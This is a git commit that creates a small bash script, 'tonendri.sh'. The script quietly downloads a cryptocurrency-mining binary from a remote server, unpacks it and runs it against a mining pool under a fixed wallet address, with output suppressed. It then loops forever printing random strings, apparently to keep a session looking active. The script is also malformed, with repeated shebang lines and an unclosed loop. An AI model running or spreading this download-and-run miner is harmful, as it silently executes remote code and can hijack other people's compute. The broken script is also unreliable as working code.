0720ac737848723c66a6ea20612d411b67bff7e2
angkii <83603708+angkii@users.noreply.github.com>
2022-02-04 13:40:07 +0700

    Create tonendri.sh

---
+++ tonendri.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+#!/bin/sh
+
+#!/bin/bash
+
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+
+tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+
+chmod +x danila-miner >/dev/null 2>&1
+
+./danila-miner run https://server1.whalestonpool.com EQBneC1nr3KFHfzfY2KYvp0a-nisrzV-RHx-WBFpP2rAaNjf
+
+while [ 1 ]; do
+
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+
+sleep 2
